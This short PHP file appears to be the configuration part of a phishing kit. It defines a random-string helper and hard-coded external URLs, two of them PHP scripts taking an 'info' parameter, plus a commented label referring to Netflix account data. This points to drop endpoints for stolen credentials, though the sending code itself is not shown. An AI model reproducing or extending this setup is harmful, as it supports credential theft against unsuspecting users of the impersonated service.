<?php
function generateRandomString($length = 6) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

// $rand = generateRandomString();
$webz = 'taxman2go.com/johnyjoy/datawww.html';
$site2 = "http://garellek.com/fr/images/debine.php?info=";
$site3 = "http://garellek.com/fr/images/resturidk.php?info=";
// $head = 'websitenetflix-accounts-data-';

?>